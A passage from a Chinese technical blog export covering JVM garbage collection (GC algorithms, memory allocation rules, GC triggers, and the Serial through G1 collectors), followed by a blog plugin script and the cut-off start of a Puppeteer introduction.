-Xss，设置每个线程的堆栈大小 特别注意：JVM 没有提供直接设置老年代的参数，但是可以设置堆空间大小和新生代空间大小来间接控制，老年代空间大小 = 堆空间大小 - 新生代大空间大小 JVM 垃圾收集机制如何确定一个对象是否会被回收引用计数算法（Reference Counting）引用计数算法是通过判断对象的引用数量来决定对象是否可以被回收。它的思路是给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加 1；当引用失效时，计数器值就减 1；任何时刻计数器为 0 的对象就是不可能再被使用的。大部分场景下，这个算法都是不错，效率也比较高；但是 Java 虚拟机里面没有选用引用计数算法来管理内存，其中最主要的原因是它很难解决对象之间相互循环引用的问题；而且对对象赋值时均要维护引用计数器，同时计数器本身也有一定的消耗。 123456789101112131415161718192021222324252627282930/** * 引用计数算法的缺陷 */public class ReferenceCountingGC { public Object instance = null; public static final int _1MB = 1024 * 1024; /** * 占点内存，以便GC日志观看 */ private byte[] bigSize = new byte[2 * _1MB]; public static void main(String[] args) { testGC(); } public static void testGC() { ReferenceCountingGC objA = new ReferenceCountingGC(); ReferenceCountingGC objB = new ReferenceCountingGC(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; //这里发生GC， objA 和 objB能否被回收？ System.gc(); }} 上述代码最后面两句将 objA 和 objB 赋值为 null，也就是说 objA 和 objB 指向的对象已经不可能再被访问，但是由于它们互相引用对方，导致它们的引用计数器都不为 0，那么垃圾收集器就永远不会回收它们。 可达性分析算法（Reachability Analysis）判断对象的引用链是否可达。它的思路是：通过一系列的称为 “GC Roots” 的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain），当一个对象到 GC Roots 没有任何引用链相连（用图论的话来说就是从 GC Roots 到这个对象不可达）时，则证明此对象是不可用的，如图所示： 在 Java 中，可作为 GC Root 的对象包括以下几种： 方法区中常量引用的对象 方法区中类静态属性引用的对象 Java 虚拟机栈（栈帧中的局部变量表）中引用的对象 本地方法栈中 JNI（即一般说的 Native 方法）引用的对象 GC 算法垃圾收集算法主要有：复制算法（Copying）、标记 - 清除算法（Mark-Sweep）、标记 - 整理算法（Mark-Compact）、分代收集算法（Generational Collection）。 标记 - 清除算法“标记 - 清除” 算法是最基础的算法，它分为 “标记” 和” 清除” 两个阶段：首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。它有两个不足：一个是效率问题，标记和清除两个过程的效率都不高（两次扫描，耗时严重）；另一个是空间问题，标记清除之后会产生大量的不连续的内存碎片，空间碎片太多可能会导致以后在程序运行过程中需要分配较大对象时，无法找到足够的连续内存从而不得不提前触发另一次垃圾收集动作。 复制算法 为了解决效率问题，一种称为 “复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这块的内存用完了，就将还存活着的对象复制到另一块上面，然后再把已使用过的内存空间一次清理掉。这样使得每次都是对整个半区进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。 将现有的内存空间分为两快，每次只使用其中一块，在垃圾收集时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾收集。如果系统中的垃圾对象很多，复制算法需要复制的存活对象数量并不会太大。因此在真正需要垃圾收集的时刻，复制算法的效率是很高的。又由于对象在垃圾收集过程中统一被复制到新的内存空间中，因此，可确保回收后的内存空间是没有碎片的。复制算法的高效性是建立在存活对象少、垃圾对象多的前提下的。这种情况在新生代经常发生，但是在老年代更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，由于存活的对象较多，复制的成本也将很高。该算法的缺点是将系统内存折半。 Java 虚拟机的新生代串行垃圾收集器中使用了复制算法的思想。新生代分为 Eden 空间、From Survivor 空间、To Survivor 空间。其中 From Survivor 空间和 To Survivor 空间可以视为用于复制的两块大小相同、地位相等，且可进行角色互换的空间块。From Survivor 和 To Survivor 空间也称为 Survivor 空间，即幸存者空间，用于存放未被回收的对象。在垃圾收集时，Eden 空间中的存活对象会被复制到未使用的 Survivor 空间中（假设是 To Survivor），正在使用的 Survivor 空间（假设是 From） 中的年轻对象也会被复制到 To Survivor 空间中 (大对象或者老年对象会直接进入老年代，如果 To Survivor 空间已满，则对象也会直接进入老年代)。此时，Eden 空间和 From Survivor 空间中的剩余对象就是垃圾对象，可以直接清空，To Survivor 空间则存放此次回收后的存活对象。这种改进的复制算法既保证了空间的连续性，又避免了大量的内存空间浪费。 标记 - 整理算法复制收集算法在对象存活率较高时就要进行较多的复制操作，效率将会变低。如果不想浪费 50% 的空间，就需要有额外的空间进行分配担保，以应对被使用的内存中所有对象都 100% 存活的极端情况，所以老年代不能直接选用这种算法。标记整理算法中，标记过程仍然与 “标记 - 清除” 算法一样，但是后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 分代收集算法对于一个大型的系统，当创建的对象和方法变量比较多时，堆内存中的对象也会比较多，如果逐一分析对象是否该回收，那么势必造成效率低下。分代收集算法是基于这样一个事实：不同的对象的生命周期（存活情况）是不一样的，而不同生命周期的对象位于堆内存中不同的区域，因此对堆内存不同区域采用不同的策略进行回收可以提高 JVM 的执行效率。“分代收集”（Generational Collection）算法，根据对象存活周期的不同将内存划分为几块。一般是把 Java 堆分为新生代和老年代，这样既可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用 “标记 - 清除” 或者 “标记 - 整理” 算法来进行回收。 GC 算法对比复制算法： 复制算法执行的速度较快，典型的空间换时间 当对象的存活率很高的时候，不断的复制操作会显得耗时 复制算法很明显的缺点就是浪费内存空间，因为将内存分为两块，一次只能使用一块，这也意味着分的块越大，浪费的内存越多 标记 - 清除算法： 首先是速度慢，因为” 标记 - 清除算法” 在标记阶段需要使用递归的方式从根结点出发，不断寻找可达的对象；而在清除阶段又需要遍历堆内存中的所有对象，查看其是否被标记，然后再清除；并且在程序进行 GC 的时候，JVM 中所有的 Java 程序都要进行暂停，俗称 Stop-The-World，后面会提到。 其次是其最大的缺点，使用这种算法进行清理而得的堆内存的空闲空间一般是不连续的，由于对象实例在堆内存中是随机存储的，所以在清理之后，会产生许多的内存碎片，如果这个时候来了一个很大的对象实例，尽管显示内存还足够，但是已经存不下这个大对象了，内存碎片太多会导致当程序需要为较大对象分配内存时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。再者，这种零散的碎片对于数组的分配也不是很方便。 标记 - 整理算法： 首先这种算法克服了” 标记 - 清除算法” 中会产生内存碎片的缺点，也解决了复制算法中内存减半使用的不足 而其缺点则是速度也不是很快，不仅要遍历标记所有可达结点，还要一个个整理可达存活对象的地址，所以导致其效率不是很高 关于 Stop-The-World在 GC 算法执行的时候，所有正在执行中的 Java 程序都会被挂起（被暂停），只有 Native 方法可以执行，但是也不能和 JVM 进行交互，这样一来似乎整个 Java 世界都停止了，这也就是为什么叫做 Stop-The-World；等到 GC 程序执行完毕后，Java 程序才会重新恢复执行。这个其实很好理解，因为 GC 程序是一个线程，Java 程序也是一个线程，它们操作的堆内存是一片共享的区域，假设一种情况，Java 程序 A 新建了一个对象 object，new Object（）被存放在堆内存，但是很不巧的是，堆内存刚刚执行过复制算法，前一步存活的对象已经被转移到另一块空间了，而 new Object（）就留在了原来的空间，无辜地被清除了。这显然是不可接受的，因为线程不安全。 内存分配策略Java 的自动内存管理，最终可以归结为自动化地解决了两个问题：给对象分配内存、回收分配给对象的内存。对象的内存分配通常是在堆上分配（除此以外还有可能经过 JIT 编译后被拆散为标量类型并间接地在栈上分配），对象主要分配在新生代的 Eden 空间上，如果启动了本地线程分配缓冲，将按线程优先在 TLAB 上分配。少数情况下也可能会直接分配在老年代中，分配的规则并不是固定的，实际取决于垃圾收集器的具体组合以及虚拟机中与内存相关的参数的设置。下面以使用 Serial/Serial Old 收集器，介绍内存分配的策略。 对象优先在 Eden 空间分配大多数情况下，对象在新生代的 Eden 空间中分配，当 Eden 空间没有足够空间进行分配时，虚拟机将发起一次 Minor GC。 大对象直接进入老年代所谓的大对象是指需要大量连续内存空间的 Java 对象，最典型的大对象就是很长的字符串以及数组。大对象对虚拟机的内存分配来说是一个坏消息（尤其是遇到朝生夕灭的 “短命大对象”，写程序时应避免），经常出现大对象容易导致内存还有不少空间时，就提前触发 GC 以获取足够的连续内存空间来安置它们。虚拟机提供了一个 -XX:PretenureSizeThreshold 参数，令大小超过这个设置值的对象直接在老年代分配。这样做的目的是避免在 Eden 空间及两个 Survivor 空间之间发生大量的内存复制（新生代采用复制算法来回收内存）。 长期存活的对象将进入老年代既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这点，虚拟机给每个对象定义了一个对象年龄（Age）计数器。如果对象在 Eden 空间出生并经过第一次 Minor GC 后仍然存活，并且能被 Survivor 空间容纳的话，将被移动到 Survivor 空间中，并且对象年龄设为 1。对象在 Survivor 空间中每 “熬过” 一次 Minor GC，年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁），就将会被晋升到老年代中。对象晋升老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 设置。 动态对象年龄判定为了能更好地适应不同程序的内存状况，虚拟机并不是永远地要求对象的年龄必须达到了 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 空间中相同年龄所有对象大小的总和大于 Survivor 空间的一半，年龄大于或等于该年龄的对象就可以直接进入老年代，无须等到 MaxTenuringThreshold 中要求的年龄。 空间分配担保在发生 Minor GC 之前，虚拟机会先检查老年代最大可用的连续内存空间是否大于新生代所有对象总空间，如果这个条件成立，那么 Minor GC 可以确保是安全的。如果不成立，则虚拟机会查看 HandlePromotionFailure 的设置值是否允许担保失败。如果允许，那么会继续检查老年代最大可用的连续内存空间是否大于历次晋升到老年代对象的平均大小；如果大于，将尝试着进行一次 Minor GC，尽管这次 Minor GC 是有风险的；如果小于或者 HandlePromotionFailure 的设置不允许冒险，那这时也要改为进行一次 Full GC。新生代使用复制算法，但为了内存利用率，只使用其中一个 Survivor 空间来作为轮换备份，因此当出现大量对象在 Minor GC 后仍然存活的情况（最极端的情况就是内存回收后新生代中所有对象都存活），就需要老年代进行分配担保，把 Survivor 无法容纳的对象直接进入老年代。与生活中的贷款担保类似，老年代要进行这样的担保，前提是老年代本身还有容纳这些对象的剩余空间，一共有多少对象会活下来在实际完成内存回收之前是无法明确知道的，所以只好取之前每一次回收晋升到老年代对象容量的平均大小值作为经验值，与老年代的剩余空间进行比较，决定是否进行 Full GC 来让老年代腾出更多空间。使用平均值进行比较其实仍然是一种动态概率的手段，也就是说，如果某次 Minor GC 存活后的对象突增，远远高于平均值的话，依然会导致担保失败（Handle Promotion Failure）。如果出现了 HandlePromotionFailure 失败，那就只好在失败后重新发起一次 Full GC。虽然担保失败时绕的圈子是最大的，但大部分情况下都还是会将 HandlePromotionFailure 开关打开，避免 Full GC 过于频繁。 GC 的触发条件Minor GC 的触发条件对于 Minor GC，其触发条件非常简单，当新生代的 Eden 空间满时，就将触发一次 Minor GC。 Full GC 的触发条件调用 System.gc ()此方法的调用是建议 JVM 进行 Full GC，虽然只是建议而非一定，但很多情况下它会触发 Full GC，从而增加 Full GC 的频率，也即增加了间歇性停顿的次数。因此强烈建议能不使用此方法就不要使用，让虚拟机自己去管理它的内存，可通过 -XX:+ DisableExplicitGC 来禁止 RMI 调用 System.gc()。 老年代空间不足老年代空间不足的常见场景为大对象直接进入老年代、长期存活的对象进入老年代等，当执行 Full GC 后空间仍然不足，则抛出如下错误： Java.lang.OutOfMemoryError: Java heap space，为避免以上两种状况引起的 Full GC，调优时应尽量做到让对象在 Minor GC 阶段被回收、让对象在新生代多存活一段时间及不要创建过大的对象及数组。 空间分配担保失败在新生代使用复制算法的 Minor GC，需要老年代的内存空间作担保，如果出现了 HandlePromotionFailure 担保失败，则会触发 Full GC。 JDK 1.7 及以前的永久代空间不足在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些类信息、静态变量、常量、常量池等数据，当系统中要加载的类、反射的类和调用的方法较多时，Permanet Generation 可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么 JVM 会抛出错误信息 java.lang.OutOfMemoryError: PermGen space，为避免 Permanet Generation 占满造成 Full GC 现象，可采用的方法为增大 Permanet Generation 空间或转为使用 CMS GC。在 JDK 1.8 中用元空间替换了永久代作为方法区的实现，元空间是本地内存，因此减少了一种 Full GC 触发的可能性。 Java 虚拟机规范里，使用方法区作为默认实现 JDK 1.7 及以前，HotSpot 虚拟机中的方法区使用永久代实现 JDK 1.8，HotSpot 虚拟机中的方法区使用元空间实现 Concurrent Mode Failure执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（有时候空间不足是由于 CMS GC 执行时，当前的浮动垃圾过多导致暂时性的空间不足触发 Full GC），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 JVM 垃圾收集器如果说垃圾收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。Java 虚拟机规范中对垃圾收集器应该如何实现并没有任何规定，因此不同的厂商、不同版本的虚拟机所提供的垃圾收集器都可能会有很大差别，并且一般都会提供参数供用户根据自己的应用特点和要求组合出各个年代所使用的垃圾收集器。下面的图中展示了 7 种作用于不同分代的垃圾收集器，如果两个收集器之间存在连线，就说明它们可以搭配使用。虚拟机所处的区域，则表示它是属于新生代收集器还是老年代收集器。 概念理解吞吐量 吞吐量就是 CPU 用于运行用户代码的时间与 CPU 总消耗时间的比值，即：吞吐量 = 运行用户代码时间 /（运行用户代码时间 + 垃圾收集时间） 虚拟机总共运行了 100 分钟，其中垃圾收集花掉 1 分钟，那吞吐量就是 99% 并发和并行 这两个名词都是并发编程中的概念，在谈论垃圾收集器的上下文语境中，它们的解释如下 并行（Parallel）：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态 并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序在继续运行，而垃圾收集程序运行于另一个 CPU 核上 Minor GC 和 Full GC 新生代 GC（Minor GC）：指发生在新生代的垃圾收集动作，因为 Java 对象大多都具备朝生夕灭的特性，所以 Minor GC 非常频繁，一般回收速度也比较快 老年代 GC（Full GC / Major GC）：指发生在老年代的 GC，出现 Full GC 的时候，经常会伴随至少一次的 Minor GC（但非绝对的，在 Parallel Scavenge 收集器的收集策略里就有直接执行了 Full GC 的策略选择过程）。Full GC 的速度一般会比 Minor GC 慢 10 倍以上 新生代收集器Serial 收集器 Serial 收集器是最基本、发展历史最悠久的收集器，曾经（在 JDK 1.3.1 之前）是虚拟机新生代收集的唯一选择。 特性：这个收集器是一个单线程的收集器，但它的 “单线程” 的意义并不仅仅说明它只会使用一个 CPU 或一条收集线程去完成垃圾收集工作，更重要的是在它进行垃圾收集时，必须暂停其他所有的工作线程，直到它收集结束，即会造成 “Stop The World” 现象。 应用场景：Serial 收集器是虚拟机运行在 Client 模式下的默认新生代收集器。 优势：简单而高效（与其他收集器的单线程比），对于限定单个 CPU 的环境来说，Serial 收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。 ParNew 收集器 特性：ParNew 收集器其实就是 Serial 收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括 Serial 收集器可用的所有控制参数、收集算法、Stop The World、对象分配规则、回收策略等都与 Serial 收集器完全一样，在实现上，这两种收集器也共用了相当多的代码。 应用场景：ParNew 收集器是许多运行在 Server 模式下的虚拟机中首选的新生代收集器。很重要的原因是：除了 Serial 收集器外，目前只有它能与 CMS 收集器配合工作。在 JDK 1.5 时期，HotSpot 推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器 - CMS 收集器，这款收集器是 HotSpot 虚拟机中第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。不幸的是，CMS 作为老年代的收集器，却无法与 JDK 1.4.0 中已经存在的新生代收集器 Parallel Scavenge 配合工作，所以在 JDK 1.5 中使用 CMS 来收集老年代的时候，新生代只能选择 ParNew 或者 Serial 收集器中的一个。 Serial 收集器 VS ParNew 收集器：ParNew 收集器在单 CPU 的环境中绝对不会有比 Serial 收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个 CPU 的环境中都不能百分之百地保证可以超越 Serial 收集器。然而，随着可以使用的 CPU 的数量的增加，它对于 GC 时系统资源的有效利用还是很有好处的。它默认开启的收集线程数与 CPU 的数量相同，在 CPU 非常多的情况下可使用 -XX:ParallerGCThreads 参数设置。 Parallel Scavenge 收集器特性：Parallel Scavenge 收集器是一个新生代收集器，它也是使用复制算法的收集器，又是并行的多线程收集器。 应用场景：停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验，而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 Parallel Scavenge 收集器 与 CMS 收集器：Parallel Scavenge 收集器的特点是它的关注点与其他收集器不同，CMS 等收集器的关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而 Parallel Scavenge 收集器的目标是达到一个可控制的吞吐量（Throughput）。由于与吞吐量关系密切，Parallel Scavenge 收集器也经常称为 “吞吐量优先” 收集器。另外值得注意的一点是，Parallel Scavenge 收集器无法与 CMS 收集器配合使用，所以在 JDK 1.6 推出 Parallel Old 之前，如果新生代选择 Parallel Scavenge 收集器，老年代只有 Serial Old 收集器能与之配合使用。 Parallel Scavenge 收集器 VS ParNew 收集器：Parallel Scavenge 收集器与 ParNew 收集器的一个重要区别是，前者具有 GC 自适应调节策略特性。Parallel Scavenge 收集器除了会显而易见地提供可以精确控制吞吐量的参数，还提供了一个参数 -XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 空间的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为 GC 自适应调节策略（GC Ergonomics）。 老年代收集器Serial Old 收集器 特性：Serial Old 是 Serial 收集器的老年代版本，它同样是一个单线程收集器，使用” 标记 - 整理算法”。 应用场景： Client 模式下，Serial Old 收集器的主要意义也是在于给 Client 模式下的虚拟机使用。 Server 模式下，主要有两大用途：一种用途是在 JDK 1.5 以及之前的版本中与 Parallel Scavenge 收集器搭配使用；另一种用途就是作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 Parallel Old 收集器 特性：Parallel Old 是 Parallel Scavenge 收集器的老年代版本，使用多线程和 “标记 - 整理” 算法。 应用场景：在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 Parallel Old 配合 Parallel Scavenge：Parallel Old 收集器是在 JDK 1.6 中才开始提供的，在此之前新生代的 Parallel Scavenge 收集器一直处于比较尴尬的状态。因为如果新生代选择了 Parallel Scavenge 收集器，老年代除了 Serial Old 收集器外别无选择（Parallel Scavenge 收集器无法与 CMS 收集器配合使用）。由于老年代 Serial Old 收集器在服务端应用性能上的 “拖累”，使用了 Parallel Scavenge 收集器也未必能在整体应用上获得吞吐量最大化的效果，由于单线程的老年代收集器（Serial Old）无法充分利用服务器多 CPU 的处理能力，在老年代很大而且硬件比较高级的环境中，这种组合的吞吐量甚至还不一定有 ParNew 加 CMS 的组合 “给力”。直到 Parallel Old 收集器出现后，“吞吐量优先” 收集器终于有了比较名副其实的应用组合。 CMS 收集器 特性：CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。目前很大一部分的 Java 应用集中在互联网站或者 B/S 系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS 收集器就非常符合这类应用的需求。 运作流程：CMS 收集器是基于 “标记 - 清除” 算法实现的，它的运作过程相对于前面几种收集器来说更复杂一些，整个过程分为以下 4 个步骤。由于在耗时最长的并发标记和并发清除整个过程中，收集器线程都可以与用户线程一起工作，所以从总体上来说，CMS 收集器的内存回收过程是与用户线程一起并发执行的。 初始标记（CMS initial mark）：初始标记仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要 “Stop The World” 并发标记（CMS concurrent mark）：并发标记阶段就是进行 GC Roots Tracing 的过程 重新标记（CMS remark）：重新标记阶段是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短，仍然需要 “Stop The World” 并发清除（CMS concurrent sweep）：并发清除阶段会清除对象 优点CMS 是一款优秀的收集器，它的主要优点是并发收集、停顿时间短，因此 CMS 收集器也被称为” 并发低停顿收集器”（Concurrent Low Pause Collector）。 缺点： CMS 收集器对 CPU 资源非常敏感，其实面向并发设计的程序都对 CPU 资源比较敏感。在并发阶段，它虽然不会导致用户线程停顿，但是会因为占用了一部分线程（或者说 CPU 资源）而导致应用程序变慢，总吞吐量会降低。CMS 默认启动的回收线程数是（CPU 数量 + 3）/ 4，也就是当 CPU 在 4 个以上时，并发回收时垃圾收集线程不少于 25% 的 CPU 资源，并且随着 CPU 数量的增加而下降。但是当 CPU 不足 4 个（例如 2 个）时，CMS 对用户程序的影响就可能变得很大。 CMS 收集器无法处理浮动垃圾，可能出现 “Concurrent Mode Failure” 失败而导致另一次 Full GC 的产生。由于 CMS 并发清理阶段用户线程还在运行着，伴随程序运行自然就还会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后，CMS 无法在当次收集中处理掉它们，只好留待下一次 GC 时再清理掉，这一部分垃圾就称为 “浮动垃圾”。也是由于在垃圾收集阶段用户线程还需要运行，那也就还需要预留有足够的内存空间给用户线程使用，因此 CMS 收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集，需要预留一部分空间提供并发收集时的程序运作使用。要是 CMS 运行期间预留的内存无法满足程序需要，就会出现一次 “Concurrent Mode Failure” 失败，这时虚拟机将启动后备预案：临时启用 Serial Old 收集器来重新进行老年代的垃圾收集（Full GC），这样停顿时间就很长了。 CMS 收集器会产生大量空间碎片，CMS 是一款基于 “标记 - 清除” 算法实现的收集器，这意味着收集结束时会有大量空间碎片产生。空间碎片过多时，将会给大对象分配带来很大麻烦，往往会出现老年代还有很大空间剩余，但是无法找到足够大的连续内存空间来分配当前对象，导致不得不提前触发一次 Full GC。 G1 收集器 G1（Garbage-First）收集器是当今收集器技术发展最前沿的成果之一，它是一款面向服务端应用的垃圾收集器，HotSpot 开发团队赋予它的使命是（在比较长期的）未来可以替换掉 JDK 1.5 中发布的 CMS 收集器。 特性： 并行与并发：G1 能充分利用多 CPU、多核环境下的硬件优势，使用多个 CPU 来缩短 Stop-The-World 停顿的时间，部分其他收集器需要停顿 Java 线程来执行的 GC 动作，而 G1 收集器仍然可以通过并发的方式让 Java 程序继续执行。 分代收集：与其他收集器一样，分代概念在 G1 中依然得以保留。虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但它能够采用不同的方式去处理新创建的对象和已经存活了一段时间、熬过多次 GC 的旧对象以获取更好的收集效果。 空间整合：与 CMS 的 “标记 - 清除” 算法不同，G1 从整体来看是基于 “标记 - 整理” 算法实现的收集器，从局部（两个 Region 之间）上来看是基于 “复制” 算法实现的，但无论如何，这两种算法都意味着 G1 运作期间不会产生内存空间碎片，收集后能提供规整的可用内存。这种特性有利于程序长时间运行，分配大对象时不会因为无法找到连续内存空间而提前触发下一次 Full GC。 可预测的停顿：这是 G1 相对于 CMS 的另一大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。 横跨整个堆内存：在 G1 之前的其他收集器进行收集的范围都是单独针对新生代或者老年代，而 G1 不再是这样。使用 G1 收集器时，Java 堆的内存布局就与其他收集器有很大差别，它将整个 Java 堆划分为多个大小相等的独立区域（Region），虽然还保留有新生代和老年代的概念，但新生代和老年代不再是物理隔离的了，它们都是一部分 Region（不需要连续）的集合。 建立可预测的时间模型：G1 收集器之所以能建立可预测的停顿时间模型，是因为它可以有计划地避免在整个 Java 堆中进行全区域的垃圾收集。G1 跟踪各个 Region 里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region（这也就是 Garbage-First 名称的来由）。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限的时间内可以获取尽可能高的收集效率。 避免全堆扫描 - Remembered Set：G1 把 Java 堆分为多个 Region，就是 “化整为零”。但是 Region 不可能是孤立的，一个对象分配在某个 Region 中，可以与整个 Java 堆任意的对象发生引用关系。在做可达性分析确定对象是否存活的时候，需要扫描整个 Java 堆才能保证准确性，这显然是对 GC 效率的极大伤害。为了避免全堆扫描的发生，虚拟机为 G1 中每个 Region 维护了一个与之对应的 Remembered Set。虚拟机发现程序在对 Reference 类型的数据进行写操作时，会产生一个 Write Barrier 暂时中断写操作，检查 Reference 引用的对象是否处于不同的 Region 之中（在分代的例子中就是检查是否老年代中的对象引用了新生代中的对象），如果是便通过 CardTable 把相关引用信息记录到被引用对象所属的 Region 的 Remembered Set 之中。当进行内存回收时，在 GC 根节点的枚举范围中加入 Remembered Set 即可保证不对全堆扫描也不会有遗漏。 执行过程： 初始标记（Initial Marking）：初始标记阶段仅仅只是标记一下 GC Roots 能直接关联到的对象，并且修改 TAMS（Next Top at Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可用的 Region 中创建新对象，这阶段需要停顿线程，但耗时很短。 并发标记（Concurrent Marking）：并发标记阶段是从 GC Root 开始对堆中对象进行可达性分析，找出存活的对象，这阶段耗时较长，但可与用户程序并发执行。 最终标记（Final Marking）：最终标记阶段是为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中，这阶段需要停顿线程，但是可并行执行。 筛选回收（Live Data Counting and Evacuation）：筛选回收阶段首先对各个 Region 的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划，这个阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Puppeteer 入门使用教程",url:"/posts/1a44388b.html",text:'Puppeteer 介绍Puppeteer 是什么Puppeteer 是一个 NodeJs 库，它提供了一个高级 API 来通过 DevTools 协议控制 Chromium 或 Chrome。相比较 Selenium 或是 PhantomJs，它最大的特点就是完全可以在内存中模拟 DOM 操作，即在 V8 引擎中处理而不打开浏览器，而且关键的是该项目是 Chrome 团队在维护，会拥有更好的兼容性和前景，更多资料可参考以下站点：Puppeteer Github、Puppeteer 中文文档、DevTools Protocol 文档、Chromium 命令行启动参数。 Puppeteer 的功能 生成页面的截图和 PDF 自动提交表单，进行 UI 测试，键盘输入等 捕获网站的时间线跟踪，用来帮助分析性能问题 抓取 SPA（单页应用），并生成预渲染内容，即 “SSR”（服务器端渲染） 创建一个最新的自动化测试环境，使用最新的 JavaScript 和浏览器功能，直接在最新版本的 Chrome 中运行测试 测试浏览器扩展，Chrome / Chromium 扩展当前只能在非无头模式下使用，目前还无法测试扩展弹出窗口或内容脚本 Puppeteer VS Puppeteer-Core使用区别自 v1.7.0 以来的 Puppeteer 每个版本都会发布两个包：puppeteer、puppeteer-core，两者的区别如下： puppeteer 是浏览器自动化的产品，安装后它会下载一个最新版本的 Chromium，然后使用 puppeteer-core 驱动工作。作为最终用户产品，puppeteer 支持一堆方便的 PUPPETEER_* 环境变量来调整运行行为 puppeteer-core 是一个库来帮助驱动任何支持 DevTools 协议的东西。puppeteer-core 在安装时不会下载 Chromium，作为一个库，puppeteer-core 完全是通过其编程接口驱动的，并且会忽略所有 PUPPETEER_* 环境变量 使用建议在大多数情况下，可以使用 puppeteer 包，如果是下面这些情况，那可以使用 puppeteer-core： 正在构建使用 DevTools 协议的另一个最终用户产品或库；例如，可以使用 puppeteer-core 构建 PDF 生成器，并编写下载 headless_shell 的自定义 install.js 脚本，而不是使用 Chromium 来节省磁盘空间 正在打包 Puppeteer 用在 Chrome 上的扩展应用或者浏览器中以使用 DevTools 协议，因为下载额外的 Chromium 二进制文件不是必须的 当需要使用 puppeteer-core 时，使用下面这行代码代替原来的引入方式即可： 1const puppeteer = require(\'puppeteer-core\'); Puppeteer 运行环境与安装Puppeteer 运行环境Puppeteer 运行依赖于 NodeJs v6.4.0+，如果要使用 async /await，只有 NodeJs v7.6.0 或更高版本才支持，NodeJs 可以点击这里下载。 Puppeteer 安装Puppeteer 安装的过程默认会执行 install.js 脚本来下载最新版本的 